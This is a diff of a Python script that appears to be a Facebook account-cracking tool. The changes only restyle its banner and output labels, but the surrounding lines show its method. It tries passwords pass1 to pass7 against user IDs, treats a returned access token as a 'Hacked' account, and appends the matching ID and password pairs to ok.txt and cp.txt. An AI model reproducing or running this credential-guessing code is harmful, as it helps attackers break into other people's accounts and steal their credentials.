@@ -86,7 +86,7 @@ logo = """
                                         03082503426    
 
 
-\033[1;96m(~)\033[1;97m Owner : RANA NADEEM RAJPUT
+\033[1;96m(~)\033[1;97m Owner : 𝐑𝐚𝐧𝐚 𝐍𝐚𝐝𝐞𝐞𝐦 𝐑𝐚𝐣𝐩𝐮𝐭
 
 \033[1;96m(~)\033[1;97m Github : https://github.com/Rananadeem5214
 
@@ -569,7 +569,7 @@ def menu_select():
 
 		    if 'www.facebook.com' in d['error_msg']:
 
-		        print("[Nadeem✉Hacked] "+uid+" | "+pass1)
+		        print("𝐑𝐚𝐧𝐚 𝐂𝐩⍟] "+uid+" | "+pass1)
 
 		        cp=open("ok.txt","a")
 
@@ -583,7 +583,7 @@ def menu_select():
 
 		    	if "access_token" in d:
 
-		            print("\x1b[1;96m[Nadeem✉Hacked] "+uid+" | "+pass1+"\x1b[1;0m")
+		            print("\x1b[1;96m[𝐍𝐚𝐝𝐞𝐞𝐦᯽𝐇𝐚𝐜𝐤𝐞𝐝] "+uid+" | "+pass1+"\x1b[1;0m")
 
 		            ok=open("ok.txt","a")
 
@@ -603,7 +603,7 @@ def menu_select():
 
 		            if 'www.facebook.com' in d['error_msg']:
 
-		                print("[Rana🔰CP] "+uid+" | "+pass2)
+		                print("[𝐑𝐚𝐧𝐚 𝐂𝐩✪] "+uid+" | "+pass2)
 
 		                cp=open("cp.txt","a")
 
@@ -617,7 +617,7 @@ def menu_select():
 
 		                if 'access_token' in d:
 
-		                    print("\x1b[1;96m[Nadeem✉Hacked] "+uid+" | "+pass2+"\x1b[1;0m")
+		                    print("\x1b[1;96m[𝐍𝐚𝐝𝐞𝐞𝐦᯽𝐇𝐚𝐜𝐤𝐞𝐝] "+uid+" | "+pass2+"\x1b[1;0m")
 
 		                    ok=open("ok.txt","a")
 
@@ -637,7 +637,7 @@ def menu_select():
 
 		                    if 'www.facebook.com' in d['error_msg']:
 
-		                        print("[Nadeem✉Hacked] "+uid+" | "+pass3)
+		                        print("[𝐑𝐚𝐧𝐚 𝐂𝐩✪] "+uid+" | "+pass3)
 
 		                        cp=open("ok.txt","a")
 
@@ -651,7 +651,7 @@ def menu_select():
 
 		                        if 'access_token' in d:
 
-		                            print(" \x1b[1;96m[Nadeem✉Hacked] "+uid+" | "+pass3+"\x1b[1;0m")
+		                            print(" \x1b[1;96m[𝐍𝐚𝐝𝐞𝐞𝐦᯽𝐇𝐚𝐜𝐤𝐞𝐝] "+uid+" | "+pass3+"\x1b[1;0m")
 
 		                            ok=open("ok.txt","a")
 
@@ -671,7 +671,7 @@ def menu_select():
 
 		                            if 'www.facebook.com' in d['error_msg']:
 
-		                                print("[Rana🔰CP] "+uid+" | "+pass4)
+		                                print("[𝐑𝐚𝐧𝐚 𝐂𝐩✪] "+uid+" | "+pass4)
 
 		                                cp=open("cp.txt","a")
 
@@ -685,7 +685,7 @@ def menu_select():
 
 		                                if 'access_token' in d:
 
-		                                    print("\x1b[1;96m[Nadeem✉Hacked] "+uid+" | "+pass4+"\x1b[1;0m")
+		                                    print("\x1b[1;96m[𝐍𝐚𝐝𝐞𝐞𝐦᯽𝐇𝐚𝐜𝐤𝐞𝐝] "+uid+" | "+pass4+"\x1b[1;0m")
 
 		                                    ok=open("ok.txt","a")
 
@@ -705,7 +705,7 @@ def menu_select():
 
 		                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                        print("[Rana🔰CP] "+uid+" | "+pass5)
+		                                        print("[𝐑𝐚𝐧𝐚 𝐂𝐩✪] "+uid+" | "+pass5)
 
 		                                        cp=open("cp.txt","a")
 
@@ -719,7 +719,7 @@ def menu_select():
 
 		                                        if 'access_token' in d:
 
-		                                            print("\x1b[1;96m[Nadeem✉Hacked] "+uid+" | "+pass5+"\x1b[1;0m")
+		                                            print("\x1b[1;96m[𝐍𝐚𝐝𝐞𝐞𝐦᯽𝐇𝐚𝐜𝐤𝐞𝐝] "+uid+" | "+pass5+"\x1b[1;0m")
 
 		                                            ok=open("ok.txt","a")
 
@@ -739,7 +739,7 @@ def menu_select():
 
 		                                            if 'www.facebook.com' in d['error_msg']:
 
-		                                                print("[Rana🔰CP] "+uid+" | "+pass6)
+		                                                print("[𝐑𝐚𝐧𝐚 𝐂𝐩✪] "+uid+" | "+pass6)
 
 		                                                cp=open("cp.txt","a")
 
@@ -753,7 +753,7 @@ def menu_select():
 
 		                                                if 'access_token' in d:
 
-		                                                    print("\x1b[1;96m[Nadeem✉Hacked] "+uid+" | "+pass6+"\x1b[1;0m")
+		                                                    print("\x1b[1;96m[𝐍𝐚𝐝𝐞𝐞𝐦᯽𝐇𝐚𝐜𝐤𝐞𝐝] "+uid+" | "+pass6+"\x1b[1;0m")
 
 		                                                    ok=open("ok.txt","a")
 
@@ -773,7 +773,7 @@ def menu_select():
 
 		                                                    if 'www.facebook.com' in d['error_msg']:
 
-		                                                        print("[Rana🔰CP] "+uid+" | "+pass7)
+		                                                        print("[𝐑𝐚𝐧𝐚 𝐂𝐩✪] "+uid+" | "+pass7)
 
 		                                                        cp=open("cp.txt","a")
 
@@ -787,7 +787,7 @@ def menu_select():
 
 		                                                        if 'access_token' in d:
 
-		                                                            print("\x1b[1;96m[Nadeem✉Hacked] "+uid+" | "+pass7+"\x1b[1;0m")
+		                                                            print("\x1b[1;96m[𝐍𝐚𝐝𝐞𝐞𝐦᯽𝐇𝐚𝐜𝐤𝐞𝐝] "+uid+" | "+pass7+"\x1b[1;0m")
 
 		                                                            ok=open("ok.txt","a")
 
